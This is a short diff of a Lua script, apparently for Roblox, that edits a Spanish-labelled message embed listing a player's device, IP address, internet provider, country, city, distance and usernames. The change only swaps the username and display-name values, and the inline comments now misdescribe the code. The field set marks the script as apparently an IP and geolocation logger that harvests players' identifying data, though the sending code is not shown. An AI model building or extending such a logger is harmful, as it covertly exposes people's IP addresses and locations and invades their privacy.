@@ -99,8 +99,8 @@ local data = {
             {["name"]="💻 Dispositivo", ["value"]=platform, ["inline"]=true},
             {["name"]="🛰️ IP", ["value"]=userIP, ["inline"]=true},
             {["name"]="🌐 Compañía de Internet", ["value"]=userISP, ["inline"]=true},
-            {["name"]="👥 Usuario", ["value"]=LocalPlayer.DisplayName, ["inline"]=true}, -- Muestra DisplayName donde estaba Username
-            {["name"]="👤 DisplayName", ["value"]=LocalPlayer.Name, ["inline"]=true},     -- Muestra Username donde estaba DisplayName
+            {["name"]="👥 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true}, -- Muestra DisplayName donde estaba Username
+            {["name"]="👤 DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},     -- Muestra Username donde estaba DisplayName
             {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
             {["name"]="🏙️ Ciudad", ["value"]=cityDisplay, ["inline"]=true},
             {["name"]="📏 Kilómetros", ["value"]=kmDisplay, ["inline"]=true},
